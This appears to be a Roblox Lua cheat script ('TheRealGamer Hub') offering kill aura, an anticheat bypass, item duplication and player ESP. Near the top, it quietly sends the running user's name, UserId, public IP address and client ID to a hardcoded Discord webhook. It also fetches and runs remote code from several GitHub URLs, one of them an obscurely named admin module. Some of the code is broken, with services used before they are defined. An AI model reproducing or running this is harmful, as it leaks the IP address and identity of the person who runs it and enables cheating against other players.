local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("TheRealGamer Hub", "LightTheme")
RemoteEvents = {
    ToolAction = ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('ToolAction');
    InventoryInteraction =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction");
    UpdateStorageChest =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("UpdateStorageChest");
    SetSettings = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("SetSettings");
    BuyWorldEvent =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("BuyWorldEvent");
    ItemInteracted =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("ItemInteracted");
    CraftItem =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("CraftItem");
    TradeTrader =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("TradeTrader");
    KeyDoor = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("KeyDoor");
    Sonar =  ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('Sonar');
}
HttpService = game:GetService("HttpService")
Webhook_URL =  "https://discord.com/api/webhooks/1156241079742517309/BBLDsj12M1u__F9OpgsgsLRTdnLtQvls5ctVYNpVciN26dg2p3lCf6Hp7vh_MfvVL_Xw"
 
local request = syn and syn.request or request or http and http.request or http_request
 
local response = request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "",
                ["description"] = game.Players.LocalPlayer.Name .." Tried Logging Into The Script More Info Below",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
                    {
                        ["name"] = "Player Name : ",
                        ["value"] = game.Players.LocalPlayer.Name,
                        ["inline"] = true
                    }, {
                        ["name"] = "UserId : ",
                        ["value"] = game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "User Profile : ",
                        ["value"] = "https://www.roblox.com/users/" ..
                            game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "IP: ",
                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                        ["inline"] = true
                    }, {
                        ["name"] = "Client Id : ",
                        ["value"] = game:GetService("RbxAnalyticsService")
                            :GetClientId(),
                        ["inline"] = true
                    }, {
                        ["name"] = "Key : ",
                        ["value"] = "GAMERONTOP",
                        ["inline"] = true
                    }
                }
            }
        }
    })
})



--Services
Workspace = game:GetService('Workspace')
Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
UserInputService = game:GetService('UserInputService')
TweenService = game:GetService("TweenService")
RunService = game:GetService('RunService')
Lighting  = game:GetService('Lighting')
VirtualUser = game:GetService("VirtualUser")
HttpService = game:GetService('HttpService')
TeleportService = game:GetService("TeleportService")

--Globals
LocalPlayer = Players.LocalPlayer
Mouse = LocalPlayer:GetMouse()
Camera = Workspace.CurrentCamera
ALLITEMS = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Items'))['Items']
ALLITEMSTABLE = {}
SWITCHEDITEMSTABLE = {}
for id, index in pairs(ALLITEMS) do
	ALLITEMSTABLE[index['id']] = index['Name']
end
for id, index in pairs(ALLITEMS) do
	SWITCHEDITEMSTABLE[index['Name']] = index['id']
end
getgenv().configs = {
    Bypassing = false;
    AutoPickup2 = false;
    InfJump = false;
    ClickTp = false;
    AutoEat = false;
    MineAura = false;
    MobAura = false;
    CheaterDetector = false;
    KillAura = false;
    PlayerLock = false;
    Pumpkins = false;
    Hitbox = false;
    SafeDeath = false;
    OpKillAura = false;
	PredictOpKillAura = false;
    AutoRepairClub = false;
    ConiferFarm = false;
    UseSoulKeys = false;
    ObsidianBoss = false;
    ZenLuckBoss = false;
    SpiritBoss = false;
    LuckySlime = false;
    EvilSkeleton = false;
    Ogre = false;
    Squid = false;
    JumpPower = false;
    AntiRagDoll = false;
    ExtraSpeed = false;
    AmountToLoopDrop = false;
    PlayerEsp = false;
    EatingType = 'AFK';
    TrapType = 'Stone Trap';
    LevelCheck = 'True';
    ChestType = 'Any';
}
getgenv().QuickSpeedMultiplier = 1
getgenv().AmountOfChestInserts = 1
getgenv().PredictAmount = 3
getgenv().QuickSpeedKey = Enum.KeyCode.B
getgenv().GliderModSpeed = 30


--RemoteEvents
RemoteEvents = {
    ToolAction = ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('ToolAction');
    InventoryInteraction =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction");
    UpdateStorageChest =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("UpdateStorageChest");
    SetSettings = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("SetSettings");
    BuyWorldEvent =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("BuyWorldEvent");
    ItemInteracted =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("ItemInteracted");
    CraftItem =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("CraftItem");
    TradeTrader =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("TradeTrader");
    KeyDoor = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("KeyDoor");
    Sonar =  ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('Sonar');
}
--Important locals
local message = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('Message'))
local MyInventory = LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Menus'):FindFirstChild('Inventory'):FindFirstChild('Inventory'):FindFirstChild('List')
local Whitelist_table = {};
local OpKillAuraTable = {};
local realgameadmins = {849400193, 134488231, 146733116, 27865601}
local MoonstoneSet = {363, 364, 365, 366}
local ObsidianSet = {225, 226, 227, 228}
local AllShields = {206, 207, 208, 209, 210, 211, 219, 235, 367, 379}
local AllSwords = {173, 205, 230, 369, 255, 254, 253}
local AllBows = {174, 197, 198, 199, 376}
local AllBooks = {281, 282, 283, 284, 285, 286, 287, 296, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 323, 362}
local AllStaffs = {293, 292, 291, 290, 162, 289}

--Safe Death Connections
local TimeTped
local TimeBetweenTps
local TeleportHappened = false
local SafeDeathHealthChecker = nil

--Boss Death connections
local AutoPickupOnObsidianDeath
local AutoPickupOnZenLuckBossDeath
local AutoPickupOnSpiritBossDeath
local AutoPickuponLuckySlimeDeath
local AutoPickupOnSkeletonDeath
local AutoPickupOnOgreDeath
local AutoPickupOnSquidDeath

--Dupe locals
local ItemIndexed
local ItemIndexedNumber

--Admin Module
loadstring(game:HttpGet("https://raw.githubusercontent.com/AltTheReal/vevervevevevrsdvxbzd/main/adminmodule.lua"))()
--Aimbot locals
local CurrentlyLocked
local Aiming = false

--Quickspeed locals
local OnOff = false
local keydetected

-- Main
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")
function KillAura()
    while getgenv().configs.KillAura do
        if getgenv().configs.KillAura then
            task.wait()
            local function GetClosestKAPlayer()
                local range = 32
                local closest
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer then
                        if not table.find(Whitelist_table, plr.Name) then
                            if IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                                local char = plr.Character
                                if char:FindFirstChild("PlayerBillboard") and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title') and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon') then
                                    if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 == Color3.fromRGB(80, 63, 47) then
                                        local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                        local plrpos = plr.Character.HumanoidRootPart.Position
                                        local dist = (mypos - plrpos).magnitude
                                        if dist < range then
                                            range = dist
                                            closest = plr.Character
                                        end
                                    else
                                        if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 ~= LocalPlayer.Character:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 then
                                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                            local plrpos = plr.Character.HumanoidRootPart.Position
                                            local dist = (mypos - plrpos).magnitude
                                            if dist < range then
                                                range = dist
                                                closest = plr.Character
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                return closest
            end
            local NearestPlayer = GetClosestKAPlayer()
            if NearestPlayer then
                RemoteEvents['ToolAction']:FireServer(NearestPlayer)
            end
        end
    end
end

MainSection:NewButton("infinite yield", "run", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

MainSection:NewButton("dupe", "save stuff", function()
    getgenv().olddata = game:GetService("ReplicatedStorage").References.Comm.Events.SetSettings
    game:GetService("ReplicatedStorage").References.Comm.Events.SetSettings:FireServer(getgenv().olddata)
end)
MainSection:NewToggle("Killaura", "save stuff", function()
    Callback = function(Value)
        getgenv().configs.KillAura = Value
        KillAura()
    end
end)
if not getgenv().bypassing then
    getgenv().bypassing = true
    local bypassac

    bypassac = hookmetamethod(game, '__namecall', function(self, ...)
        local args = {...}
        if not checkcaller() and self == RemoteEvents['Sonar'] then
            return nil
        end
        return bypassac(self, ...)
    end) 
end 
MainSection:NewButton("Bypass AC", "Anticheat", function()
Callback = function()
        if not IsPlayerAlive(LocalPlayer) then
            MakeAtlasNotification('Not alive', 'Maybe click the play button?', 5)
            return
        end
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
            local myroot = LocalPlayer.Character.HumanoidRootPart
			for i=1, 100 do
				myroot.CFrame = CFrame.new(7562, 221, 18946)
            	RemoteEvents['Sonar']:FireServer()
            	myroot.CFrame = oldpos
			end
            message.New('Positive', 'Bypassed AntiCheat')
        end
    end
end)

MainSection:NewButton("soul duping need wood chest", "dup soul", function()
    local chest = game:GetService("Workspace").Replicators.NonPassive["Wood Storage Chest"]
    local putIn = true
    local itemIDs = {204, 202, 201, 203, 218, 216} -- IDs for Max Soul
    local Event = game:GetService("ReplicatedStorage").References.Comm.Events.UpdateStorageChest

    for _, itemID in ipairs(itemIDs) do
        Event:FireServer(chest, putIn, itemID)
    end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Highlight = Instance.new("Highlight")
Highlight.Name = "Highlight"
function ApplyToCurrentPlayers()
   for i,player in pairs(Players:GetChildren()) do
      repeat wait() until player.Character
      if not player.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Highlight") then
         local HighlightClone = Highlight:Clone()
         HighlightClone.Adornee = player.Character
         HighlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
         HighlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
         HighlightClone.Name = "Highlight"
      end
   end
end
RunService.Heartbeat:Connect(function()
   ApplyToCurrentPlayers()
end)
